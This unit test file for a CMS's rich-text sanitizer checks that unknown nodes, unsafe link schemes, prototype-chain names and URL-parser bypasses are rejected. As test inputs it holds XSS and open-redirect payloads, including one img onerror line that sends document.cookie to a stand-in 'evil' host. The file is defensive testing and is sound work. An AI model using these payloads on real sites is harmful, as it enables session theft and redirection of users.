// Unit tests for @pramen/cms's structured rich text (pure — no server boot).
//
// `richtext` used to be an HTML string scrubbed with js-xss on write. It is now a document
// tree, and the write-path boundary is a STRUCTURAL allow-list: unknown node/mark types are
// dropped, only declared attributes survive, and a `link` href must pass a scheme check.

import { expect, test } from "bun:test";
import {
  DEFAULT_RICH_TEXT_SCHEMA,
  MAX_RICH_TEXT_DEPTH,
  isSafeHref,
  normalizeHref,
  normalizeFields,
  normalizeRichText,
  richTextToPlainText,
  validateFields,
  type FieldDefinition,
  type RichTextDoc,
} from "@pramen/cms";

const doc = (...content: unknown[]): RichTextDoc => ({ type: "doc", content: content as RichTextDoc["content"] });
const para = (...content: unknown[]) => ({ type: "paragraph", content });
const text = (value: string, marks?: unknown[]) => ({ type: "text", text: value, ...(marks ? { marks } : {}) });

test("normalizeRichText keeps the allow-listed vocabulary", () => {
  const input = doc(
    { type: "heading", attrs: { level: 2 }, content: [text("Title")] },
    para(text("plain "), text("bold", [{ type: "bold" }])),
    { type: "bulletList", content: [{ type: "listItem", content: [para(text("one"))] }] },
  );
  expect(normalizeRichText(input)).toEqual(input as RichTextDoc);
});

test("normalizeRichText drops unknown node types", () => {
  const out = normalizeRichText(doc(para(text("kept")), { type: "iframe", attrs: { src: "https://evil.example" } }));
  expect(out.content).toEqual([para(text("kept"))] as RichTextDoc["content"]);
});

test("normalizeRichText drops unknown marks but keeps the text", () => {
  const out = normalizeRichText(doc(para(text("hi", [{ type: "bold" }, { type: "onclick" }]))));
  expect(out.content).toEqual([para(text("hi", [{ type: "bold" }]))] as RichTextDoc["content"]);
});

test("normalizeRichText drops a link mark with an unsafe href", () => {
  const unsafe = doc(para(text("click", [{ type: "link", attrs: { href: "javascript:alert(1)" } }])));
  // The MARK goes, not the text — an anchor with no destination is worse than plain text.
  expect(normalizeRichText(unsafe).content).toEqual([para(text("click"))] as RichTextDoc["content"]);

  const safe = doc(para(text("click", [{ type: "link", attrs: { href: "/about", title: "About" } }])));
  expect(normalizeRichText(safe)).toEqual(safe as RichTextDoc);
});

test("isSafeHref matches the editor's own link allow-list", () => {
  for (const ok of ["https://example.com", "http://example.com", "mailto:a@b.c", "tel:+420123", "/relative", "#anchor"]) {
    expect(isSafeHref(ok)).toBe(true);
  }
  for (const bad of ["javascript:alert(1)", "JavaScript:alert(1)", "data:text/html,<script>", "vbscript:x", "evil.com", 42, null]) {
    expect(isSafeHref(bad)).toBe(false);
  }
});

test("normalizeRichText keeps only declared attributes, and only JSON primitives", () => {
  const out = normalizeRichText(
    doc({ type: "heading", attrs: { level: 3, onclick: "steal()", nested: { a: 1 } }, content: [text("H")] }),
  );
  expect(out.content?.[0].attrs).toEqual({ level: 3 });
});

test("normalizeRichText rejects an out-of-range heading level", () => {
  const out = normalizeRichText(doc({ type: "heading", attrs: { level: 99 }, content: [text("H")] }));
  expect(out.content?.[0].attrs).toBeUndefined();
});

test("normalizeRichText yields an empty doc for a non-document value", () => {
  expect(normalizeRichText("<p>legacy html</p>")).toEqual({ type: "doc", content: [] });
  expect(normalizeRichText(null)).toEqual({ type: "doc", content: [] });
});

test("a custom schema can widen or narrow the vocabulary", () => {
  const narrow = { nodes: { doc: [], paragraph: [], text: [] }, marks: {} };
  const out = normalizeRichText(doc(para(text("hi", [{ type: "bold" }])), { type: "heading", content: [text("H")] }), narrow);
  expect(out.content).toEqual([para(text("hi"))] as RichTextDoc["content"]);
  expect(DEFAULT_RICH_TEXT_SCHEMA.nodes.heading).toEqual(["level"]);
});

test("validateFields rejects a legacy HTML string with a message naming the migration", () => {
  const schema: FieldDefinition[] = [{ name: "body", type: "richtext" }];
  expect(() => validateFields(schema, { body: "<p>hi</p>" })).toThrow(/not an HTML string/);
  expect(() => validateFields(schema, { body: { type: "paragraph" } })).toThrow(/must be a rich-text document/);
  expect(() => validateFields(schema, { body: doc(para(text("ok"))) })).not.toThrow();
});

test("normalizeFields normalizes richtext nested in group and repeater", () => {
  const schema: FieldDefinition[] = [
    { name: "intro", type: "richtext" },
    { name: "meta", type: "group", fields: [{ name: "note", type: "richtext" }] },
    { name: "items", type: "repeater", fields: [{ name: "body", type: "richtext" }] },
    { name: "title", type: "text" },
  ];
  const evil = doc(para(text("x", [{ type: "link", attrs: { href: "javascript:alert(1)" } }])));
  const out = normalizeFields(schema, {
    intro: evil,
    meta: { note: evil },
    items: [{ body: evil }],
    title: "untouched",
  });
  const clean = [para(text("x"))];
  expect((out.intro as RichTextDoc).content).toEqual(clean as RichTextDoc["content"]);
  expect(((out.meta as Record<string, RichTextDoc>).note).content).toEqual(clean as RichTextDoc["content"]);
  expect(((out.items as Record<string, RichTextDoc>[])[0].body).content).toEqual(clean as RichTextDoc["content"]);
  expect(out.title).toBe("untouched");
});

test("richTextToPlainText flattens to words with block boundaries", () => {
  const input = doc(
    { type: "heading", attrs: { level: 2 }, content: [text("Title")] },
    para(text("Hello "), text("world", [{ type: "bold" }])),
    { type: "bulletList", content: [{ type: "listItem", content: [para(text("one"))] }, { type: "listItem", content: [para(text("two"))] }] },
  );
  expect(richTextToPlainText(input)).toBe("Title\nHello world\none\ntwo");
  expect(richTextToPlainText(null)).toBe("");
});

test("richTextToPlainText turns a hard break into a newline", () => {
  expect(richTextToPlainText(doc(para(text("a"), { type: "hardBreak" }, text("b"))))).toBe("a\nb");
});

// --- regression gates from the #36 review ------------------------------------

test("isSafeHref rejects protocol-relative urls, backslash variant included", () => {
  // Both resolve off-site while looking local. The backslash form works because the URL
  // parser folds `\` to `/` at path-start:
  //   new URL("/\\evil.example/x", "https://site.test/a") -> https://evil.example/x
  expect(isSafeHref("//evil.example/x")).toBe(false);
  expect(isSafeHref("/\\evil.example/x")).toBe(false);
  expect(new URL("/\\evil.example/x", "https://site.test/a").host).toBe("evil.example");
  expect(isSafeHref("/still-relative")).toBe(true);
  expect(isSafeHref("https://example.com//path")).toBe(true);
});

test("an empty text node is dropped, not stored", () => {
  // ProseMirror forbids one outright (`schema.text("")` throws), and the editor builds its
  // document in a useState initializer — so storing one bricks that row's edit UI.
  const out = normalizeRichText(doc(para(text(""), text("kept"))));
  expect(out.content).toEqual([para(text("kept"))] as RichTextDoc["content"]);
});

test("a custom richTextSchema actually narrows what is stored", () => {
  // The previous version of this test only asserted the handler object existed, which
  // passed even with the option unwired. Exercise the schema itself.
  const narrow = { nodes: { doc: [], paragraph: [], text: [] }, marks: { bold: [] } };
  const schema: FieldDefinition[] = [{ name: "body", type: "richtext" }];
  const input = { body: doc({ type: "heading", attrs: { level: 2 }, content: [text("H")] }, para(text("kept", [{ type: "bold" }]), text("x", [{ type: "highlight" }]))) };

  const wide = normalizeFields(schema, input).body as RichTextDoc;
  expect(wide.content?.[0].type).toBe("heading"); // default schema keeps it

  const narrowed = normalizeFields(schema, input, narrow).body as RichTextDoc;
  expect(narrowed.content?.map((n) => n.type)).toEqual(["paragraph"]); // heading dropped
  expect(narrowed.content?.[0].content?.[0].marks).toEqual([{ type: "bold" }]);
  expect(narrowed.content?.[0].content?.[1].marks).toBeUndefined(); // highlight dropped
});

test("the allow-list is not bypassable through the prototype chain", () => {
  // A plain-object index resolves `constructor`/`toString`/`valueOf` to inherited members,
  // which are truthy — so these passed the gate, were stored, and then crashed both
  // renderers and the editor. `{type:"constructor",attrs:{}}` additionally threw a
  // TypeError inside the DO's storage.transaction() (a 500, not a 400).
  for (const type of ["constructor", "toString", "valueOf", "hasOwnProperty", "__proto__"]) {
    expect(normalizeRichText(doc({ type })).content).toEqual([]);
    expect(() => normalizeRichText(doc({ type, attrs: {} }))).not.toThrow();
  }
  const marked = normalizeRichText(doc(para(text("hi", [{ type: "toString" }, { type: "constructor" }]))));
  expect(marked.content?.[0].content?.[0].marks).toBeUndefined();
});

test("isSafeHref is not bypassable with an embedded tab or newline", () => {
  // The URL parser strips ASCII tab/CR/LF before parsing, so these resolve off-site while
  // passing a prefix test that only inspects the character after the leading slash.
  for (const href of ["/\r\n/evil.example/x", "/\t/evil.example/x", "/\t\\evil.example/x"]) {
    expect(new URL(href, "https://site.test/a").host).toBe("evil.example");
    expect(isSafeHref(href)).toBe(false);
  }
  // A tab inside an otherwise fine relative path is stripped, not treated as an escape.
  expect(normalizeHref("/about\tus ")).toBe("/aboutus");
});

test("a legacy HTML string is tolerated only when it matches the stored value", () => {
  const schema: FieldDefinition[] = [{ name: "body", type: "richtext" }];
  const stored = { body: "<p>what is already in the row</p>" };
  // Echoing back exactly what is stored is fine — that is the editor's whole-bag autosave.
  expect(() => validateFields(schema, stored, "", { legacyBaseline: stored })).not.toThrow();
  // Anything else is rejected. Without this, the dropped `xss` sanitizer meant any caller
  // could store arbitrary HTML for consumers still rendering with set:html.
  const attack = { body: "<img src=x onerror=fetch('//evil/'+document.cookie)>" };
  expect(() => validateFields(schema, attack, "", { legacyBaseline: stored })).toThrow(/not an HTML string/);
});

test("normalizeRichText caps recursion instead of blowing the stack", () => {
  // JSON.parse is iterative in V8, so a deeply nested payload reaches the normalizer
  // intact — and this runs inside the DO's storage.transaction().
  let node: Record<string, unknown> = { type: "text", text: "deep" };
  for (let i = 0; i < MAX_RICH_TEXT_DEPTH + 50; i++) node = { type: "blockquote", content: [node] };
  const out = normalizeRichText({ type: "doc", content: [node] });
  let depth = 0;
  let cursor = out.content?.[0];
  while (cursor?.content?.[0]) {
    cursor = cursor.content[0];
    depth++;
  }
  expect(depth).toBeLessThanOrEqual(MAX_RICH_TEXT_DEPTH + 1);
});

test("a legacy HTML string is kept, not emptied, when it is tolerated", () => {
  const schema: FieldDefinition[] = [{ name: "body", type: "richtext" }];
  const legacy = { body: "<p>stored before the migration</p>" };
  // Default: strict, because the value is new input.
  expect(() => validateFields(schema, legacy)).toThrow(/not an HTML string/);
  // Normalization must NOT turn a tolerated string into an empty doc — that would delete
  // the very content the tolerance exists to preserve.
  expect(normalizeFields(schema, legacy).body).toBe("<p>stored before the migration</p>");
});

test("richTextToPlainText gives a collapsed block something to show", () => {
  // The editor's block preview used to pick the first non-empty STRING field; a richtext
  // field is an object, so a prose-only block read "empty".
  const body = doc(para(text("Wide-ranging notes on the topic")));
  expect(richTextToPlainText(body)).toBe("Wide-ranging notes on the topic");
});
